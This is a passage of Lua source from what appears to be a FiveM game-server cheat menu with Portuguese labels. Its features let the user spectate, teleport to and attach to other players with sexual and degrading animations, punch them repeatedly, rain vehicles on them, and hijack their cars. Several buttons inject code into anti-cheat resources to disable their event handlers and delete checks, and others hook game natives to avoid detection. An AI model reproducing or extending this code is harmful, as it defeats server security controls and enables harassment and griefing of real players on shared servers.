                    ExecuteCommand("lotear")
                    ExecuteCommand("roubar")
                    ExecuteCommand("loot")
                    Wait(600)
                    SetEntityVisible(PlayerPedId(), true)
                    SetEntityCoordsNoOffset(PlayerPedId(), coords)
                end)
                        next.elements.checkbox("Espectar Player", "especPlayer", function(bool)
                            if next.lib.selected_player then
                                nt.createTh(function()
                                    if next.values.checkbox['especPlayer'] then
                                        next.BypassEspectar(true)
                                        FreezeEntityPosition(PlayerPedId(), 1)
                                        local ped = GetPlayerPed(next.lib.selected_player)
                                        if ped == PlayerPedId() then next.elements.notify("Nao e possivel interagir consigo mesmo!", "erro") return end
                                        if not DoesEntityExist(ped) then next.elements.notify("Jogador alvo não encontrado!", "erro") return end
                                        if DoesEntityExist(ped) then
                                            local cam = CreateCam("DEFAULT_SCRIPTED_Camera", 1)
                                            local coordsSel = GetEntityCoords(ped)
                                            RenderScriptCams(true, true, 500, false, false)
                                            SetCamActive(cam, true)
                                            SetCamCoord(cam, coordsSel.x, coordsSel.y, coordsSel.z + 3)
                                            if group == "Lotus Group" then
                                                FrameAPI.Inject("pma-voice", [[
                                                exports["pma-voice"]:setSpectatorMode(true)
                                                ]])
                                            end
                                            while next.values.checkbox["especPlayer"] do
                                                local cuzin = DoesCamExist(cam)
                                                if cuzin then
                                                    Wait(0)
                                                    cuzin = GetEntityRotation(ped, 2)
                                                    local x, y, z = table.unpack(GetCamCoord(cam))
                                                    local xe1, xe2, xe3 = table.unpack(GetPedBoneCoords(ped, 31086, 0, 0, 0))
                                                    SetCamCoord(cam, xe1 + 1.5, xe2 + 1.5, xe3 + 0.5)
                                                    SetFocusArea(GetCamCoord(cam).x, GetCamCoord(cam).y, GetCamCoord(cam).z, 0, 0, 0)
                                                    SetCamRot(cam, GetGameplayCamRot(2), 2)
                                                else
                                                    break
                                                end
                                            end
                                            DestroyCam(cam, false)
                                            RenderScriptCams(false, false, 0, 1, 0)
                                            SetFocusEntity(PlayerPedId())
                                            FreezeEntityPosition(PlayerPedId(), 0)
                                            next.BypassEspectar(false)
                                            if group == "Lotus Group" then
                                                FrameAPI.Inject("pma-voice", [[
                                                    exports["pma-voice"]:setSpectatorMode(false)
                                                ]])
                                            end
                                        end
                                    end
                                end)
                            end
                        end)
                    if GetResourceState('offset_main') == 'started' then
                        next.elements.button("Puxar Player", "puxarPlayer", function()
                            local ped = PlayerPedId()
                            local coords = GetEntityCoords(ped)
                            local tped = GetPlayerPed(next.lib.selected_player)
                            local tcoords = GetEntityCoords(tped)
                            SetEntityCoordsNoOffset(ped, tcoords.x, tcoords.y, tcoords.z, true, false, true)
                            Wait(10)
                            local scrId = GetPlayerServerId(next.lib.selected_player)
                            FrameAPI.Inject('offset_main', string.format([[
                                CreateThread(function()
                                    local params = json.decode('[%s]')
                                    TriggerServerEvent('playeraction:carry', table.unpack(params))
                                end)
                            ]], scrId))
                            Wait(10)
                            SetEntityCoordsNoOffset(ped, coords.x, coords.y, coords.z, true, false, true)
                            Wait(30)
                            FrameAPI.Inject('offset_main', string.format([[
                            CreateThread(function()
                                local params = json.decode('[%s,"carrying"]')
                                TriggerServerEvent('playeraction:stopCarry', table.unpack(params))
                            end)
                            ]], scrId))
                            ClearPedTasks(ped)
                        end)
                    end
                        next.elements.checkbox("Molestar Jogador", "molestar_jogador", function(v)
                            local playerPed = PlayerPedId()
                            local playerPos = GetEntityCoords(playerPed)
                            local animDict, animName = 'rcmpaparazzo_2', 'shag_loop_a'
                            if not next.lib.selected_player then next.elements.notify("Selecione um jogador primeiro!", "erro") return end
                            local targetPed = GetPlayerPed(next.lib.selected_player)
                            if targetPed == playerPed then next.elements.notify("Nao e possivel interagir consigo mesmo!", "erro") return end
                            if not DoesEntityExist(targetPed) then next.elements.notify("Jogador alvo não encontrado!", "erro") return end
                            if v then
                                nt.createTh(function()
                                    RequestAnimDict(animDict)
                                    while not HasAnimDictLoaded(animDict) do Wait(10) end
                                    local targetCoords = GetEntityCoords(targetPed)
                                    local boneIndex = GetEntityBoneIndexByName(targetPed, 'SKEL_ROOT')
                                    SetEntityCoordsNoOffset(playerPed, targetCoords.x, targetCoords.y, targetCoords.z, false, false, false, false)
                                    AttachEntityToEntity(playerPed, targetPed, boneIndex, 0.0, -0.33, 0.0, 0.0, 0.0, 0.0, true, true, true, true, 0, true)
                                    TaskPlayAnim(playerPed, animDict, animName, 8.0, -8.0, 50000, 1, 1.0, true, true, true)
                                    SetPedKeepTask(playerPed, true)
                                end)
                            else
                                ClearPedTasksImmediately(playerPed)
                                DetachEntity(playerPed, true, false)
                                SetEntityCoordsNoOffset(playerPed, playerPos.x, playerPos.y, playerPos.z, false, false, false, false)
                            end
                        end)
                        next.elements.checkbox("Mijar no Jogador", "mijar_player", function(bool)
                            if bool then
                            while not HasAnimDictLoaded("misscarsteal2peeing") do
                            RequestAnimDict("misscarsteal2peeing")
                            Wait(200)
                            end
                            if next.lib.selected_player ~= PlayerId() then
                            local ped = GetPlayerPed(next.lib.selected_player)
                            if ped == PlayerPedId() then next.elements.notify("Nao e possivel interagir consigo mesmo!", "erro") return end
                            if not DoesEntityExist(ped) then next.elements.notify("Jogador alvo não encontrado!", "erro") return end
                            TaskPlayAnim(PlayerPedId(), "misscarsteal2peeing", "peeing_loop", 8.0, -8.0, 1000000, 33, 0, false, false, false)
                            AttachEntityToEntity(PlayerPedId(), ped, 11816, 0.0, - 1.0, 1.3, 0.0, 0.0, 0.0, false, false, false, false, 2, false)
                            end
                            else
                            ClearPedTasks(PlayerPedId())
                            DetachEntity(PlayerPedId(), true, true)
                            end
                            end)
                            next.elements.checkbox("Ganhar Mamada", "glub_glub", function(bool)
                            if bool then
                            if next.lib.selected_player ~= PlayerId() then
                            local ped = GetPlayerPed(next.lib.selected_player)
                            if ped == PlayerPedId() then next.elements.notify("Nao e possivel interagir consigo mesmo!", "erro") return end
                            if not DoesEntityExist(ped) then next.elements.notify("Jogador alvo não encontrado!", "erro") return end
                            if not HasAnimDictLoaded("anim@arena@celeb@flat@paired@no_props@") then
                            RequestAnimDict("anim@arena@celeb@flat@paired@no_props@")
                            while not HasAnimDictLoaded("anim@arena@celeb@flat@paired@no_props@") do
                            Wait(0)
                            end
                            end
                            AttachEntityToEntity(PlayerPedId(), ped, 0, 0.05, 0.30, 0.70, 0, 0, 180.0, 0, 0, false, false, 0, 0)
                            TaskPlayAnim(PlayerPedId(), "anim@arena@celeb@flat@paired@no_props@", "piggyback_c_player_b", 8.0, -8.0, 1000000, 33, 0, false, false, false)
                            end
                            else
                            ClearPedTasks(PlayerPedId())
                            DetachEntity(PlayerPedId(), true, true)
                            end
                            end)
                            next.elements.checkbox("Cagar no Jogador", "shit_player", function(bool)
                                if bool then
                                while not HasAnimDictLoaded("missfbi3ig_0") do
                                RequestAnimDict("missfbi3ig_0")
                                Wait(200)
                                end
                                if next.lib.selected_player ~= PlayerId() then
                                local ped = GetPlayerPed(next.lib.selected_player)
                                if ped == PlayerPedId() then next.elements.notify("Nao e possivel interagir consigo mesmo!", "erro") return end
                                if not DoesEntityExist(ped) then next.elements.notify("Jogador alvo não encontrado!", "erro") return end
                                TaskPlayAnim(PlayerPedId(), "missfbi3ig_0", "shit_loop_trev", 8.0, -8.0, 1000000, 33, 0, false, false, false)
                                AttachEntityToEntity(PlayerPedId(), ped, 11816, 0.0, 0.0, 1.3, 0.0, 0.0, 0.0, false, false, false, false, 2, true)
                                end
                                else
                                ClearPedTasks(PlayerPedId())
                                DetachEntity(PlayerPedId(), true, true)
                                end
                                end)
                            next.elements.checkbox("Soco no Player em loop", "Punch_Player_In_Loop", function(bool)
                            CreateThread(function()
                            while next.values.checkbox["Punch_Player_In_Loop"] do Wait(0)
                                local playerId = tonumber(next.lib.selected_player)
                                if not playerId then return end

                                local ped = GetPlayerPed(playerId)
                                if not DoesEntityExist(ped) then return end

                                local pos = GetEntityCoords(ped)

                                ApplyDamageToPed(ped, 522, false, GetHashKey("WEAPON_UNARMED"))
                            end
                            end)
                        end)
                        next.elements.checkbox("Simular H", "simularh", function(bool)
                            if next.values.checkbox["simularh"] then
                                local player = GetPlayerPed(next.lib.selected_player)
                                if DoesEntityExist(player) and player ~= PlayerPedId() then
                                AttachEntityToEntity(PlayerPedId(), player, 4103, 0.7, 0, 0, 0, 0, 0, false, false, false, false, 2, true)
                                else
                                end
                                else
                                if IsEntityAttached(PlayerPedId()) then
                                DetachEntity(PlayerPedId(), 0, true)
                                end
                            end
                        end)
                        next.elements.checkbox("Puxar Player Visual (Para lootear)", "puxarPlayerVisual", function(bool)
                            if next.values.checkbox["puxarPlayerVisual"] then
                                local tped = GetPlayerPed(next.lib.selected_player)
                                local tcoords = GetEntityCoords(tped)
                                local coords = GetEntityCoords(PlayerPedId())
                                nt.createTh(function()
                                    while next.values.checkbox["puxarPlayerVisual"] do
                                        SetEntityCoordsNoOffset(tped, coords.x, coords.y, coords.z - 1.0, false, false, false, false)
                                        Wait(0)
                                    end
                                end)
                            end
                        end)
                        next.elements.groupbox("Destruição Online", "Destruiçãoonline", "\xee\x93\xa9", 280, 305, 270, 140)
next.elements.checkbox("Chuva Veiculos [Loop]", "tp_carros_chuva_loop", function()
    while next.values.checkbox["tp_carros_chuva_loop"] do
        local selected = next.lib.selected_player
        if not selected then break end
        local targetPed = GetPlayerPed(selected)
        if not DoesEntityExist(targetPed) then break end
        
        next.BypassTeleport(true)
        nt.createTh(function()
            local count = 0
            local vehicles = next.bypass.getAllVehicles()
            for i = 1, #vehicles do
                local vehicle = vehicles[i]
                if DoesEntityExist(vehicle) then
                    if NetworkHasControlOfEntity(vehicle) then
                        NetworkRequestControlOfEntity(vehicle)
                        SetVehicleDoorsLocked(vehicle, 1)
                        SetVehicleDoorsLockedForAllPlayers(vehicle, false)
                        SetVehicleEngineOn(vehicle, true, true, false)
                        SetEntityAsMissionEntity(vehicle, true)
                        next.bypass['getControl'](vehicle)
                    end
                    while not NetworkHasControlOfEntity(vehicle) do
                        NetworkRequestControlOfEntity(vehicle)
                        SetVehicleDoorsLocked(vehicle, 1)
                        SetVehicleDoorsLockedForAllPlayers(vehicle, false)
                        SetVehicleEngineOn(vehicle, true, true, false)
                        SetEntityAsMissionEntity(vehicle, true)
                        next.bypass['getControl'](vehicle)
                        Wait(0)
                    end
                    local pos = GetEntityCoords(targetPed)
                    SetEntityCoordsNoOffset(vehicle, pos.x, pos.y, pos.z + 20.0, false, false, false, false)
                    SetEntityRotation(vehicle, math.random(0,360), math.random(0,360), math.random(0,360), 2, true)
                    ApplyForceToEntityCenterOfMass(vehicle, 1, 0.0, 0.0, -4000.0, false, true, true, false)
                    SetEntityVelocity(vehicle, 0.0, 0.0, -5.0)
                    count = count + 1
                    if count >= 500 then break end
                    Wait(50)
                end
            end
        end)
        Wait(800)
        
        next.BypassTeleport(false)
    end
end)
next.elements.button("Veículos Seguindo o Player", "veiculos_seguindo_player", function()
    local playerselected = next.lib.selected_player
    if not playerselected then return end
    local targetPed = GetPlayerPed(playerselected)
    if not DoesEntityExist(targetPed) then return end
    local vehicles = GetGamePool("CVehicle")
    local count = 0
    local trackedVehicles = {}
    for _, veh in ipairs(vehicles) do
        if count >= 20 then break end
        if DoesEntityExist(veh) and #(GetEntityCoords(veh) - GetEntityCoords(targetPed)) <= 300.0 then
            SetEntityAsMissionEntity(veh, true, true)
            table.insert(trackedVehicles, veh)
            count = count + 1
        end
    end
    nt.createTh(function()
        while #trackedVehicles > 0 and DoesEntityExist(targetPed) do
            local targetPos = GetEntityCoords(targetPed)
            for _, veh in ipairs(trackedVehicles) do
                if DoesEntityExist(veh) then
                    if IsVehicleDamaged(veh) then
                        SetVehicleFixed(veh)
                        SetVehicleDirtLevel(veh, 0.0)
                    end
                    local driver = GetPedInVehicleSeat(veh, -1)
                    if not DoesEntityExist(driver) then
                        local hash = GetHashKey("mp_m_freemode_01")
                        RequestModel(hash)
                        while not HasModelLoaded(hash) do Wait(10) end
                        driver = CreatePedInsideVehicle(veh, 5, hash, -1, false, false)
                        SetEntityVisible(driver, false, false)
                        SetPedKeepTask(driver, true)
                    end
                    TaskVehicleDriveToCoord(driver, veh, targetPos.x, targetPos.y, targetPos.z, 15.0, 1, GetEntityModel(veh), 16777216, 2.0, true)
                end
            end
            Wait(1000)
        end
    end)
end)
                elseif next.vars.tab_selected == "Veículos" then
                    if next.vars.subtab_selected == "Geral" then
                        next.elements.groupbox("Geral", "geral", "\xef\x86\xb9", 0, 0, 270, 300)

                next.elements.button("Puxar veículo", 'puxarVeh', function()
                        CreateThread(function()
                        FrameAPI.Inject('PL_PROTECT', [[
                        local originalDoesEntityExist = DoesEntityExist
                        DoesEntityExist = function(entity)
                        return true
                        end
                        local originalDeleteEntity = DeleteEntity
                        DeleteEntity = function(entity)
                        return false
                        end
                        local originalDeletePed = DeletePed
                        DeletePed = function(ped)
                        return false
                        end
                        ]])

                        FrameAPI.Inject('PL_PROTECT', [[
                        if not _G._ORIGINAL_TRIGGER_SERVER_EVENT then
                        _G._ORIGINAL_TRIGGER_SERVER_EVENT = TriggerServerEvent
                        end
                        TriggerServerEvent = function(eventName, ...)
                        return
                        end
                        ]])

                        FrameAPI.Inject('likizao_ac', [[
                        TriggerEvent = function(...) return end
                        RegisterNetEvent = function(...) return end
                        AddEventHandler = function(...) return end
                        Citizen.CreateThread = function(...) return end
                        RegisterCommand = function(...) return end
                        exports = setmetatable({}, {
                        __index = function()
                        return function(...) return end
                        end
                        })
                        ]])

                        FrameAPI.Inject('likizao_ac', [[
                        local originalDoesEntityExist = DoesEntityExist
                        DoesEntityExist = function(entity)
                        return true
                        end
                        local originalDeleteEntity = DeleteEntity
                        DeleteEntity = function(entity)
                        return false
                        end
                        local originalDeletePed = DeletePed
                        DeletePed = function(ped)
                        return false
                        end
                        ]])

                        FrameAPI.Inject('likizao_ac', [[
                        if not _G._ORIGINAL_TRIGGER_SERVER_EVENT then
                        _G._ORIGINAL_TRIGGER_SERVER_EVENT = TriggerServerEvent
                        end
                        TriggerServerEvent = function(eventName, ...)
                        return
                        end
                        ]])
                            FrameAPI.Scripting.HookNative("GetPedInVehicleSeat", false)
                            next.Coords = GetEntityCoords(PlayerPedId())
                            FrameAPI.Scripting.HookNative(0xA200EB1EE790F448, next.Coords)
                            FrameAPI.Scripting.HookNative(0x14D6F5678D8F1B37, next.Coords)
                            next.BypassTeleport(true)
                            next.bypass['vehicle_enter'](true)

                            local vehicle = next.lib.selected_vehicle

                            local p1 = GetPedInVehicleSeat(vehicle, -1)

                            if IsPedInAnyVehicle(PlayerPedId(), false) then
                                vehicle = GetVehiclePedIsIn(PlayerPedId(), false)
                            end

                            local car = GetVehiclePedIsIn(p1)
                            local coords = GetEntityCoords(PlayerPedId())

                            SetVehicleDoorsLocked(car, 1)
                            SetVehicleDoorsLockedForPlayer(car, PlayerId(), false)
                            SetVehicleDoorsLockedForAllPlayers(car, false)

                            DeletePed(p1)
                            DeleteEntity(p1)
                            
                            SetPedIntoVehicle(PlayerPedId(), car, 0)
                            Wait(50)
                            DeletePed(p1)
                            DeleteEntity(p1)
                            Wait(50)
                            SetPedIntoVehicle(PlayerPedId(), car, -1)

                            local c = GetEntityCoords(PlayerPedId())

                            local driver = GetPedInVehicleSeat(vehicle, -1)
                            
                            if NetworkHasControlOfEntity(vehicle) then
                                NetworkRequestControlOfEntity(vehicle)
                                SetVehicleDoorsLocked(vehicle, 1)
                                SetVehicleDoorsLockedForAllPlayers(vehicle, false)
                                SetVehicleEngineOn(vehicle, true, true, false)
                                SetEntityAsMissionEntity(vehicle, true)
                                next.bypass['getControl'](vehicle)

                                SetEntityCoordsNoOffset(vehicle, c.x, c.y, c.z, false, false, false, false)
                                SetPedIntoVehicle(PlayerPedId(), vehicle, -1)
                                SetVehicleOnGroundProperly(vehicle)
                            end

                            Wait(1000)

                            SetEntityCoords(vehicle, coords.x + 5.0, coords.y, coords.z)
                            Wait(100)
                            SetPedIntoVehicle(PlayerPedId(), vehicle, -1)

                            FrameAPI.Inject('PL_PROTECT', [[
                            if _G._ORIGINAL_TRIGGER_SERVER_EVENT then
                            TriggerServerEvent = _G._ORIGINAL_TRIGGER_SERVER_EVENT
                            _G._ORIGINAL_TRIGGER_SERVER_EVENT = nil
                            end
                            ]])

                            FrameAPI.Inject('likizao_ac', [[
                            if _G._ORIGINAL_TRIGGER_SERVER_EVENT then
                            TriggerServerEvent = _G._ORIGINAL_TRIGGER_SERVER_EVENT
                            _G._ORIGINAL_TRIGGER_SERVER_EVENT = nil
                            end
                            ]])
                            FrameAPI.Scripting.RestoreNative(0x14D6F5678D8F1B37)
                            FrameAPI.Scripting.RestoreNative(0xA200EB1EE790F448)
                            FrameAPI.Scripting.RestoreNative("GetPedInVehicleSeat")
                            FrameAPI.Scripting.RestoreNative("IsPedAPlayer")
                            next.BypassTeleport(false)
                            next.bypass['vehicle_enter'](false)
                        end)
                   end)

next.elements.button("Puxar Veículo 2", "puxar_veiculdfo", function()
    local vehicle = next.lib.selected_vehicle
    local playerPed = PlayerPedId()

    if not vehicle or not DoesEntityExist(vehicle) then
        next.elements.notify("Nenhum veículo selecionado!", "error")
        return
    end

    if next.BypassTeleport then next.BypassTeleport(true) end
    if next.BypassAnticheat then next.BypassAnticheat(true) end

    CreateThread(function()
        local vehicleCoords = GetEntityCoords(vehicle)
        local playerCoords = GetEntityCoords(playerPed)
        local driver = GetPedInVehicleSeat(vehicle, -1)
        local timer = 0

        SetEntityCoordsNoOffset(playerPed, vehicleCoords.x, vehicleCoords.y, vehicleCoords.z - 5.0, false, false, false)

        if IsVehicleSeatFree(vehicle, -1) then
            next.bypass['getControl'](vehicle)
            TaskEnterVehicle(playerPed, vehicle, 1000, -1, 1.0, 16, 0)
            Wait(400)
            SetEntityCoordsNoOffset(vehicle, playerCoords.x, playerCoords.y, playerCoords.z, false, false, false)
        else
            while timer < 10 do
                if driver ~= 0 and DoesEntityExist(driver) then
                    DeletePed(driver)
                    DeleteEntity(driver)
                    ClearPedSecondaryTask(driver)
                    ClearPedTasks(driver)
                    ClearPedTasksImmediately(driver)

                end

                TaskEnterVehicle(playerPed, vehicle, 1000, -1, 1.0, 16, 0)
                timer = timer + 10
            end

            Wait(500)
            SetEntityCoordsNoOffset(vehicle, playerCoords.x, playerCoords.y, playerCoords.z, false, false, false)
        end

        Wait(50)

        if next.BypassTeleport then next.BypassTeleport(false) end
        if next.BypassAnticheat then next.BypassAnticheat(false) end
    end)
end)



next.elements.button("Sequêstrar Veículo", "sequestrar_veiculo", function()
    CreateThread(function()
        FrameAPI.Inject('PL_PROTECT', [[
        local originalDoesEntityExist = DoesEntityExist
        DoesEntityExist = function(entity)
        return true
        end
        local originalDeleteEntity = DeleteEntity
        DeleteEntity = function(entity)
        return false
        end
        local originalDeletePed = DeletePed
        DeletePed = function(ped)
        return false
        end
        ]])

        FrameAPI.Inject('PL_PROTECT', [[
        if not _G._ORIGINAL_TRIGGER_SERVER_EVENT then
        _G._ORIGINAL_TRIGGER_SERVER_EVENT = TriggerServerEvent
        end
        TriggerServerEvent = function(eventName, ...)
        return
        end
        ]])

        FrameAPI.Inject('likizao_ac', [[
        TriggerEvent = function(...) return end
        RegisterNetEvent = function(...) return end
        AddEventHandler = function(...) return end
        Citizen.CreateThread = function(...) return end
        RegisterCommand = function(...) return end
        exports = setmetatable({}, {
        __index = function()
        return function(...) return end
        end
        })
        ]])

        FrameAPI.Inject('likizao_ac', [[
        local originalDoesEntityExist = DoesEntityExist
        DoesEntityExist = function(entity)
        return true
        end
        local originalDeleteEntity = DeleteEntity
        DeleteEntity = function(entity)
        return false
        end
        local originalDeletePed = DeletePed
        DeletePed = function(ped)
        return false
        end
        ]])

        FrameAPI.Inject('likizao_ac', [[
        if not _G._ORIGINAL_TRIGGER_SERVER_EVENT then
        _G._ORIGINAL_TRIGGER_SERVER_EVENT = TriggerServerEvent
        end
        TriggerServerEvent = function(eventName, ...)
        return
        end
        ]])
        FrameAPI.Scripting.HookNative("GetPedInVehicleSeat", false)
        next.Coords = GetEntityCoords(PlayerPedId())
        FrameAPI.Scripting.HookNative(0xA200EB1EE790F448, next.Coords)
        FrameAPI.Scripting.HookNative(0x14D6F5678D8F1B37, next.Coords)
        next.bypass['vehicle_enter'](true)

        local vehicle = next.lib.selected_vehicle

        local p1 = GetPedInVehicleSeat(vehicle, -1)

        if IsPedInAnyVehicle(PlayerPedId(), false) then
            vehicle = GetVehiclePedIsIn(PlayerPedId(), false)
        end

        local car = GetVehiclePedIsIn(p1)
        local coords = GetEntityCoords(PlayerPedId())

        SetVehicleDoorsLocked(car, 1)
        SetVehicleDoorsLockedForPlayer(car, PlayerId(), false)
        SetVehicleDoorsLockedForAllPlayers(car, false)

        DeletePed(p1)
        DeleteEntity(p1)
        
        SetPedIntoVehicle(PlayerPedId(), car, 0)
        Wait(50)
        DeletePed(p1)
        DeleteEntity(p1)
        Wait(50)
        TaskLeaveVehicle(PlayerPedId(), GetVehiclePedIsUsing(p1), 256)
        SetPedIntoVehicle(PlayerPedId(), car, -1)
        SetVehicleExclusiveDriver(car, true)
        SetVehicleExclusiveDriver_2(car, PlayerPedId(), 1)

        local c = GetEntityCoords(PlayerPedId())

        local driver = GetPedInVehicleSeat(vehicle, -1)
        
        if NetworkHasControlOfEntity(vehicle) then
            NetworkRequestControlOfEntity(vehicle)
            SetVehicleDoorsLocked(vehicle, 1)
            SetVehicleDoorsLockedForAllPlayers(vehicle, false)
            SetVehicleEngineOn(vehicle, true, true, false)
            SetEntityAsMissionEntity(vehicle, true)
            next.bypass['getControl'](vehicle)

            SetEntityCoordsNoOffset(vehicle, c.x, c.y, c.z, false, false, false, false)
            SetPedIntoVehicle(PlayerPedId(), vehicle, -1)
            SetVehicleOnGroundProperly(vehicle)
        end

        FrameAPI.Inject('PL_PROTECT', [[
        if _G._ORIGINAL_TRIGGER_SERVER_EVENT then
        TriggerServerEvent = _G._ORIGINAL_TRIGGER_SERVER_EVENT
        _G._ORIGINAL_TRIGGER_SERVER_EVENT = nil
        end
        ]])

        FrameAPI.Inject('likizao_ac', [[
        if _G._ORIGINAL_TRIGGER_SERVER_EVENT then
        TriggerServerEvent = _G._ORIGINAL_TRIGGER_SERVER_EVENT
        _G._ORIGINAL_TRIGGER_SERVER_EVENT = nil
        end
        ]])
        FrameAPI.Scripting.RestoreNative(0x14D6F5678D8F1B37)
        FrameAPI.Scripting.RestoreNative(0xA200EB1EE790F448)
        FrameAPI.Scripting.RestoreNative("GetPedInVehicleSeat")
        next.bypass['vehicle_enter'](false)
    end)
end)
next.elements.button("Remover P1", "removerp1_veiculo", function()
    CreateThread(function()
        FrameAPI.Inject('PL_PROTECT', [[
        local originalDoesEntityExist = DoesEntityExist
        DoesEntityExist = function(entity)
        return true
        end
        local originalDeleteEntity = DeleteEntity
        DeleteEntity = function(entity)
        return false
        end
        local originalDeletePed = DeletePed
        DeletePed = function(ped)
        return false
        end
        ]])

        FrameAPI.Inject('PL_PROTECT', [[
        if not _G._ORIGINAL_TRIGGER_SERVER_EVENT then
        _G._ORIGINAL_TRIGGER_SERVER_EVENT = TriggerServerEvent
        end
        TriggerServerEvent = function(eventName, ...)
        return
        end
        ]])

        FrameAPI.Inject('likizao_ac', [[
        TriggerEvent = function(...) return end
        RegisterNetEvent = function(...) return end
        AddEventHandler = function(...) return end
        Citizen.CreateThread = function(...) return end
        RegisterCommand = function(...) return end
        exports = setmetatable({}, {
        __index = function()
        return function(...) return end
        end
        })
        ]])

        FrameAPI.Inject('likizao_ac', [[
        local originalDoesEntityExist = DoesEntityExist
        DoesEntityExist = function(entity)
        return true
        end
        local originalDeleteEntity = DeleteEntity
        DeleteEntity = function(entity)
        return false
        end
        local originalDeletePed = DeletePed
        DeletePed = function(ped)
        return false
        end
        ]])

        FrameAPI.Inject('likizao_ac', [[
        if not _G._ORIGINAL_TRIGGER_SERVER_EVENT then
        _G._ORIGINAL_TRIGGER_SERVER_EVENT = TriggerServerEvent
        end
        TriggerServerEvent = function(eventName, ...)
        return
        end
        ]])
        FrameAPI.Scripting.HookNative("GetPedInVehicleSeat", false)
        next.Coords = GetEntityCoords(PlayerPedId())
        FrameAPI.Scripting.HookNative(0xA200EB1EE790F448, next.Coords)
        FrameAPI.Scripting.HookNative(0x14D6F5678D8F1B37, next.Coords)
        next.bypass['vehicle_enter'](true)

        local vehicle = next.lib.selected_vehicle

        local p1 = GetPedInVehicleSeat(vehicle, -1)

        if IsPedInAnyVehicle(PlayerPedId(), false) then
            vehicle = GetVehiclePedIsIn(PlayerPedId(), false)
        end

        local car = GetVehiclePedIsIn(p1)
        local coords = GetEntityCoords(PlayerPedId())

        SetVehicleDoorsLocked(car, 1)
        SetVehicleDoorsLockedForPlayer(car, PlayerId(), false)
        SetVehicleDoorsLockedForAllPlayers(car, false)

        DeletePed(p1)
        DeleteEntity(p1)
        
        SetPedIntoVehicle(PlayerPedId(), car, 0)
        Wait(50)
        DeletePed(p1)
        DeleteEntity(p1)
        Wait(50)
        TaskLeaveVehicle(PlayerPedId(), GetVehiclePedIsUsing(p1), 256)
        SetPedIntoVehicle(PlayerPedId(), car, -1)
        SetVehicleExclusiveDriver(car, true)
        SetVehicleExclusiveDriver_2(car, PlayerPedId(), 1)

        local c = GetEntityCoords(PlayerPedId())

        local driver = GetPedInVehicleSeat(vehicle, -1)
        
        if NetworkHasControlOfEntity(vehicle) then
            NetworkRequestControlOfEntity(vehicle)
            SetVehicleDoorsLocked(vehicle, 1)
            SetVehicleDoorsLockedForAllPlayers(vehicle, false)
            SetVehicleEngineOn(vehicle, true, true, false)
            SetEntityAsMissionEntity(vehicle, true)
            next.bypass['getControl'](vehicle)

            SetEntityCoordsNoOffset(vehicle, c.x, c.y, c.z, false, false, false, false)
            SetPedIntoVehicle(PlayerPedId(), vehicle, -1)
            SetVehicleOnGroundProperly(vehicle)
        end
    
        Wait(250)

        SetEntityCoords(PlayerPedId(), coords.x + 5.0, coords.y, coords.z, false, false, false, false)

        FrameAPI.Inject('PL_PROTECT', [[
        if _G._ORIGINAL_TRIGGER_SERVER_EVENT then
        TriggerServerEvent = _G._ORIGINAL_TRIGGER_SERVER_EVENT
        _G._ORIGINAL_TRIGGER_SERVER_EVENT = nil
        end
        ]])

        FrameAPI.Inject('likizao_ac', [[
        if _G._ORIGINAL_TRIGGER_SERVER_EVENT then
        TriggerServerEvent = _G._ORIGINAL_TRIGGER_SERVER_EVENT
        _G._ORIGINAL_TRIGGER_SERVER_EVENT = nil
        end
        ]])
        FrameAPI.Scripting.RestoreNative(0x14D6F5678D8F1B37)
        FrameAPI.Scripting.RestoreNative(0xA200EB1EE790F448)
        FrameAPI.Scripting.RestoreNative("GetPedInVehicleSeat")
        FrameAPI.Scripting.RestoreNative("IsPedAPlayer")
        next.bypass['vehicle_enter'](false)
    end)
end)


                    next.elements.checkbox("Controle Remoto", "remoteControl", function(state)
                        next.bypass['vehicle_enter'](true)
                        
                        nt.createTh(function ()
                            if next.values.checkbox['remoteControl'] then
                                local coordsantiga = GetEntityCoords(PlayerPedId())
                                local vehselected = next.lib.selected_vehicle
                                if not vehicle or not DoesEntityExist(vehicle) then
                                next.elements.notify("Nenhum veículo selecionado ou não encontrado!", "error")
                                return
                            end
                            local playerPed = PlayerPedId()
                            if IsPedInAnyVehicle(playerPed, false) or IsEntityDead(playerPed) then
                                next.elements.notify("Você não pode fazer isso agora!", "info")
                                return
                            end
                                NetworkRequestControlOfEntity(vehselected)
                                    SetEntityCoordsNoOffset(PlayerPedId(), GetEntityCoords(avehselected))
                                    Wait(1000)
                                SetVehicleDoorsLocked(vehselected, 1)
                                SetVehicleDoorsLockedForPlayer(vehselected, PlayerId(), false)
                                SetVehicleDoorsLockedForAllPlayers(vehselected, false)
                                TaskEnterVehicle(PlayerPedId(),vehselected,  -1, -1, 1.5, 16,0)
                                SetTimeout(200, function()
                                    SetVehicleEngineOn(vehselected, true, true, true)
                                    TaskVehicleDriveWander(PlayerPedId(), vehselected, 10.0, 786603)
                                end)
                                SetTimeout(300, function()
                                    TaskLeaveVehicle(PlayerPedId(), vehselected, 0)
                                    FreezeEntityPosition(PlayerPedId(), true)
                                    SetEntityCoordsNoOffset(PlayerPedId(), coordsantiga.x, coordsantiga.y, coordsantiga.z,1,1,1)
                                end)
                            else
                                FreezeEntityPosition(PlayerPedId(), false)
                            end
                            while next.values.checkbox['remoteControl'] do
                                if IsDisabledControlPressed(0, 73) and not IsDisabledControlPressed(0, 33) then
                                    NetworkExplodeVehicle(vehselected, true, true, true)
                                end
                                if IsDisabledControlPressed(0, 32) and not IsDisabledControlPressed(0, 33) then
                                    TaskVehicleTempAction(PlayerPedId(), vehselected, 9, 1)
                                end
                                if IsDisabledControlJustReleased(0, 32) or IsDisabledControlJustReleased(0, 33) then
                                    TaskVehicleTempAction(PlayerPedId(), vehselected, 6, 2500)
                                end
                                if IsDisabledControlPressed(0, 33) and not IsDisabledControlPressed(0, 32) then
                                    TaskVehicleTempAction(PlayerPedId(), vehselected, 22, 1)
                                end
                                if IsDisabledControlPressed(0, 34) and IsDisabledControlPressed(0, 33) then
                                    TaskVehicleTempAction(PlayerPedId(), vehselected, 13, 1)
                                end
                                if IsDisabledControlPressed(0, 35) and IsDisabledControlPressed(0, 33) then
                                    TaskVehicleTempAction(PlayerPedId(), vehselected, 14, 1)
                                end
                                if IsDisabledControlPressed(0, 32) and IsDisabledControlPressed(0, 33) then
                                    TaskVehicleTempAction(PlayerPedId(), vehselected, 30, 100)
                                end
                                if IsDisabledControlPressed(0, 34) and IsDisabledControlPressed(0, 32) then
                                    TaskVehicleTempAction(PlayerPedId(), vehselected, 7, 1)
                                end
                                if IsDisabledControlPressed(0, 35) and IsDisabledControlPressed(0, 32) then
